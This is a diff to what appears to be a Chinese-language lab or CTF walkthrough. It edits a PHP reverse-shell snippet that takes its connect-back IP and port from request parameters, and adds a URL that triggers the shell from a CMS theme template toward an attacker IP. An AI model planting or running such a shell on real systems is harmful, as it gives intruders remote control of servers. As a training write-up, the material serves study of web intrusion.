@@ -179,8 +179,8 @@ dirsearch扫目录
 ```php
 <?php 
 set_time_limit(0); 
-$ip=$_POST['ip'];
-$port=$_POST['port'];
+$ip=$_REQUEST['ip'];
+$port=$_REQUEST['port'];
 $fp=@fsockopen($ip,$port,$errno,$errstr);
 if(!$fp){echo "error";}
 else{
@@ -196,4 +196,8 @@ fclose($fp);
 ?>
 
 ```
+
+`http://ourcms.mofo.pwn:18080/theme/Innovation/template.php?ip=192.168.163.129&port=23457`
+
+![](attachments/Pasted%20image%2020230303203156.png)
 
